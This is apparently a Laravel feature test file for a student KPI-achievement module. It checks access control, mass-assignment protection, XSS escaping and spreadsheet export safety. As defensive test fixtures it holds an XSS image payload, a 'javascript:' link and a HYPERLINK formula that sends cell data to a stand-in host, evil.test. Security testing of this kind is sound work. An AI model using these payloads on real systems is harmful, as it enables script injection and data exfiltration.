<?php

namespace Tests\Feature\Mahasiswa;

use App\Models\Desa;
use App\Models\Kpi;
use App\Models\Kpicapaian;
use App\Models\Mahasiswa;
use App\Models\Mahasiswa_lokasi;
use App\Models\Pjdesa;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as ExcelType;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use App\Exports\CapaiankpiExport;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Tests\TestCase;

class KpicapaianTest extends TestCase
{
    use RefreshDatabase;

    /** @var array<int, Kpi> */
    private array $kpi = [];

    protected function setUp(): void
    {
        parent::setUp();
        foreach ([1, 2] as $i) {
            $this->kpi[$i] = Kpi::factory()->create(['nama_kpi' => 'KPI '.$i]);
        }
    }

    private function loginKetua()
    {
        $user = $this->loginAs('mahasiswa', ['akses' => 'pjdesa']);
        Pjdesa::create(['email' => $user->email, 'id_desa' => Desa::factory()->create()->id_desa]);

        return $user;
    }

    private function payload(int $kpi, array $override = []): array
    {
        return $override + [
            'id_kpi' => $this->kpi[$kpi]->id_kpi,
            'bulan' => now()->toDateString(),
            'status_capaian' => 'P',
            'tautan' => 'https://drive.google.com/x',
            'permasalahan' => 'Masalah',
            'solusi' => 'Solusi',
            'kendala' => 'Kendala',
        ];
    }

    // IDOR: ketua tidak bisa mengubah capaian ketua lain
    public function test_cannot_edit_or_delete_other_students_capaian(): void
    {
        $capaianLain = Kpicapaian::factory()->create([
            'email' => 'ketua-lain@pps.test',
            'id_kpi' => $this->kpi[1]->id_kpi,
        ]);
        $this->loginKetua();

        $this->get('kpicapaian/edit/'.$capaianLain->id_capaian)->assertNotFound();
        $this->put('kpicapaian/update', $this->payload(1, ['id_capaian' => $capaianLain->id_capaian]))->assertNotFound();
        $this->put('kpicapaian/destroy', ['id_capaian' => $capaianLain->id_capaian])->assertNotFound();
        $this->assertDatabaseHas('kpi_capaian', ['id_capaian' => $capaianLain->id_capaian, 'solusi' => $capaianLain->solusi]);
    }

    public function test_listdata_escapes_free_text(): void
    {
        $user = $this->loginKetua();
        Kpicapaian::factory()->create([
            'email' => $user->email,
            'id_kpi' => $this->kpi[1]->id_kpi,
            'permasalahan' => '<img src=x onerror=alert(1)>',
            'tautan' => 'javascript:alert(1)',
        ]);

        $row = $this->getJson('kpicapaian/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->json('data.0');

        $this->assertStringNotContainsString('<img', $row['permasalahan']);
        $this->assertSame(now()->startOfMonth()->translatedFormat('F Y'), $row['bulan_label']);
        $this->assertSame('', $row['tautan']);
        // Ketua: kolom aksi berisi tombol edit/hapus
        $this->assertStringContainsString('kpicapaian/edit/', $row['action']);
        $this->get('kpicapaian/listdata')->assertOk()->assertSee("data: 'action'", false)->assertSee('<th width="1">Aksi</th>', false);
    }

    // Anggota ditempatkan di desa yang ketuanya ketua-lain@pps.test
    private function loginAnggota()
    {
        $user = $this->loginAs('mahasiswa');
        $pj = Pjdesa::create(['email' => 'ketua-lain@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $this->tempatkan($user->email, $pj->id_desa);

        return $user;
    }

    private function tempatkan(string $email, string $idDesa): void
    {
        $mhs = Mahasiswa::where('email', $email)->first() ?? Mahasiswa::factory()->create(['email' => $email]);
        // loginAs sudah membuat lokasi tahun ini; timpa desanya
        Mahasiswa_lokasi::updateOrCreate(['tahun' => (int) date('Y'), 'id_mahasiswa' => $mhs->id_mahasiswa], ['id_desa' => $idDesa, 'user_in_up' => $email]);
    }

    private function jumlahSampah(): int
    {
        return DB::table('kpi_sampah')->count();
    }

    public function test_ketua_bisa_crud_tanpa_mengubah_kpi_sampah(): void
    {
        $user = $this->loginKetua();
        $pjdesa = Pjdesa::where('email', $user->email)->first();
        $sampahAwal = $this->jumlahSampah();

        $this->get('kpicapaian/tambah')->assertOk()->assertSee('name="id_kpi"', false)
            ->assertDontSee('organik_kg', false)->assertDontSee('anorganik_kg', false)->assertDontSee('residu_kg', false)->assertDontSee('data-sampah-form', false);

        $this->put('kpicapaian/insert', $this->payload(1, ['bulan' => now()->startOfMonth()->addDays(2)->toDateString()]))
            ->assertOk()->assertJson(['success' => true]);
        $capaian = Kpicapaian::where('email', $user->email)->sole();
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertSame(now()->startOfMonth()->toDateString(), Carbon::parse($capaian->bulan)->toDateString());

        // Duplikat bulan ditolak
        $this->put('kpicapaian/insert', $this->payload(2))->assertJsonMissing(['success' => true]);
        $this->assertSame(1, Kpicapaian::where('email', $user->email)->count());

        $this->get('kpicapaian/edit/'.$capaian->id_capaian)->assertOk()->assertSee($capaian->id_capaian)
            ->assertDontSee('organik_kg', false)->assertDontSee('data-sampah-form', false);

        $this->put('kpicapaian/update', $this->payload(2, ['id_capaian' => $capaian->id_capaian, 'solusi' => 'Solusi baru', 'status_capaian' => 'Y']))
            ->assertOk()->assertJson(['success' => true]);
        $capaian->refresh();
        $this->assertSame('Solusi baru', $capaian->solusi);
        $this->assertSame($this->kpi[2]->id_kpi, $capaian->id_kpi);

        $this->put('kpicapaian/destroy', ['id_capaian' => $capaian->id_capaian])->assertOk()->assertJson(['success' => true]);
        $this->assertDatabaseMissing('kpi_capaian', ['id_capaian' => $capaian->id_capaian]);

        $this->assertSame($sampahAwal, $this->jumlahSampah());
    }

    public function test_non_ketua_403_di_semua_route_tulis(): void
    {
        $user = $this->loginAnggota();
        $milikSendiri = Kpicapaian::factory()->create(['email' => $user->email, 'id_kpi' => $this->kpi[1]->id_kpi]);

        $this->get('kpicapaian/tambah')->assertForbidden();
        $this->get('kpicapaian/edit/'.$milikSendiri->id_capaian)->assertForbidden();
        $this->put('kpicapaian/insert', $this->payload(1, ['bulan' => now()->subMonth()->toDateString()]))->assertForbidden();
        $this->put('kpicapaian/update', $this->payload(1, ['id_capaian' => $milikSendiri->id_capaian, 'solusi' => 'Diubah']))->assertForbidden();
        $this->put('kpicapaian/destroy', ['id_capaian' => $milikSendiri->id_capaian])->assertForbidden();

        $this->assertSame(1, Kpicapaian::count());
        $this->assertDatabaseHas('kpi_capaian', ['id_capaian' => $milikSendiri->id_capaian, 'solusi' => $milikSendiri->solusi]);

        // Role pt di grup yang sama juga bukan ketua
        $this->loginAs('pt');
        $this->get('kpicapaian/tambah')->assertForbidden();
        $this->put('kpicapaian/insert', $this->payload(1))->assertForbidden();
    }

    public function test_idor_id_tidak_ada_404(): void
    {
        $this->loginKetua();
        $acak = (string) Str::uuid();

        $this->get('kpicapaian/edit/'.$acak)->assertNotFound();
        $this->put('kpicapaian/update', $this->payload(1, ['id_capaian' => $acak]))->assertNotFound();
        $this->put('kpicapaian/destroy', ['id_capaian' => $acak])->assertNotFound();
    }

    public function test_email_id_pjdesa_dan_field_sampah_dari_input_diabaikan(): void
    {
        $user = $this->loginKetua();
        $pjdesa = Pjdesa::where('email', $user->email)->first();
        $pjdesaLain = Pjdesa::create(['email' => 'ketua-lain@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $sampahAwal = $this->jumlahSampah();
        $injeksi = ['email' => 'ketua-lain@pps.test', 'id_pjdesa' => $pjdesaLain->id_pjdesa, 'id_capaian_baru' => 'x',
            'organik_kg' => 99, 'anorganik_kg' => 99, 'residu_kg' => 99, 'jml_rumah' => 50, 'created_at' => '2000-01-01'];

        $this->put('kpicapaian/insert', $this->payload(1) + $injeksi)->assertOk()->assertJson(['success' => true]);
        $capaian = Kpicapaian::sole();
        $this->assertSame($user->email, $capaian->email);
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertNotSame('2000', substr((string) $capaian->created_at, 0, 4));

        $this->put('kpicapaian/update', $this->payload(1, ['id_capaian' => $capaian->id_capaian]) + $injeksi)->assertOk();
        $capaian->refresh();
        $this->assertSame($user->email, $capaian->email);
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertSame(0, Kpicapaian::where('email', 'ketua-lain@pps.test')->count());

        $this->assertSame($sampahAwal, $this->jumlahSampah());
    }

    public function test_tombol_tambah_dan_aksi_hanya_untuk_ketua(): void
    {
        $this->loginAnggota();
        Kpicapaian::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kpi' => $this->kpi[1]->id_kpi]);

        $this->get('kpicapaian')->assertOk()->assertDontSee('kpicapaian/tambah', false);
        $this->get('kpicapaian/listdata')->assertOk()->assertDontSee("data: 'action'", false)->assertDontSee('<th width="1">Aksi</th>', false);
        $row = $this->getJson('kpicapaian/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])->assertOk()->json('data.0');
        $this->assertSame('', $row['action']);

        $this->loginKetua();
        $this->get('kpicapaian')->assertOk()->assertSee('kpicapaian/tambah', false);
        $this->get('kpicapaian/listdata')->assertOk()->assertSee("data: 'action'", false);
    }

    public function test_anggota_melihat_capaian_kelompoknya_saja(): void
    {
        $this->loginAnggota();
        $kelompok = Kpicapaian::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kpi' => $this->kpi[1]->id_kpi]);
        $pjLuar = Pjdesa::create(['email' => 'ketua-luar@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $luar = Kpicapaian::factory()->create(['email' => $pjLuar->email, 'id_kpi' => $this->kpi[2]->id_kpi]);

        $data = $this->getJson('kpicapaian/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->json('data');

        $this->assertCount(1, $data);
        $this->assertSame($kelompok->id_capaian, $data[0]['id_capaian']);
        $this->assertSame('', $data[0]['action']);
        $this->assertNotContains($luar->id_capaian, array_column($data, 'id_capaian'));

        // Tetap read-only: data kelompok tidak bisa diubah anggota
        $this->get('kpicapaian/edit/'.$kelompok->id_capaian)->assertForbidden();
        $this->put('kpicapaian/destroy', ['id_capaian' => $kelompok->id_capaian])->assertForbidden();

        // Anggota di desa tanpa ketua: kosong
        $this->loginAs('mahasiswa');
        $this->getJson('kpicapaian/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->assertJsonCount(0, 'data');
    }

    public function test_export_anggota_sama_dengan_scope_listdata(): void
    {
        $user = $this->loginAnggota();
        $kelompok = Kpicapaian::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kpi' => $this->kpi[1]->id_kpi]);
        $pjLuar = Pjdesa::create(['email' => 'ketua-luar@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        Kpicapaian::factory()->create(['email' => $pjLuar->email, 'id_kpi' => $this->kpi[2]->id_kpi]);

        $this->get('kpicapaian/export')->assertOk();
        // Controller mengirim email user mahasiswa ke export
        $rows = (new CapaiankpiExport($user->email))->collection();
        $this->assertCount(1, $rows);
        $this->assertSame($kelompok->email, $rows->first()['PJ Desa']);

        // Desa tanpa ketua: file kosong
        $lain = $this->loginAs('mahasiswa');
        $this->assertCount(0, (new CapaiankpiExport($lain->email))->collection());
    }

    public function test_export_capaian_teks_berawalan_sama_dengan_bukan_formula(): void
    {
        $user = $this->loginKetua();
        $formula = '=HYPERLINK("https://evil.test/?d="&B2,"Klik")';
        Kpicapaian::factory()->create(['email' => $user->email, 'id_kpi' => $this->kpi[1]->id_kpi,
            'permasalahan' => $formula, 'solusi' => '=1+1', 'kendala' => 'biasa']);

        $path = tempnam(sys_get_temp_dir(), 'cap').'.xlsx';
        file_put_contents($path, Excel::raw(new CapaiankpiExport($user->email), ExcelType::XLSX));
        $ws = IOFactory::load($path)->getActiveSheet();
        @unlink($path);

        // F = Permasalahan, G = Solusi (tanpa kolom No)
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('F2')->getDataType());
        $this->assertSame($formula, $ws->getCell('F2')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('G2')->getDataType());
        $this->assertSame('=1+1', $ws->getCell('G2')->getValue());
    }
}
